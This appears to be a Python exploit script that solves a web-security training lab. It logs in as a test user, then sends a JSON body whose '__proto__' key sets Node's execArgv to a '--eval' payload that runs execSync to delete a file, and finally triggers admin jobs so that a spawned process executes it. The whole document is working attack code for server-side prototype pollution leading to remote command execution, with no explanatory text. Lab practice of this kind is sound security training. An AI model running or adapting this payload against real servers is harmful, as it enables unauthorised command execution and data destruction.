import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
change_url = burp_url + '/my-account/change-address'
#delete_url = burp_url + '/admin/delete?username=carlos'
admin_url = burp_url +'/admin'

session = requests.Session()

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

burp_json = {"csrf": csrf, "password": "peter", "username": "wiener"}
session.post(login_url, json=burp_json)

cookie_value = session.cookies.get('session')

burp_json={"__proto__": {"execArgv": ["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]}, "address_line_1": "Wiener HQ", "address_line_2": "One Wiener Way", "city": "Wienerville", "country": "UK", "postcode": "BU1 1RP", "sessionId": cookie_value}
r = session.post(change_url, json=burp_json)
response = session.get(admin_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

cookie_value = session.cookies.get('session')
burp_json={"csrf": csrf, "sessionId": cookie_value, "tasks": ["db-cleanup", "fs-cleanup"]}
session.post(admin_url+'/jobs', json=burp_json)
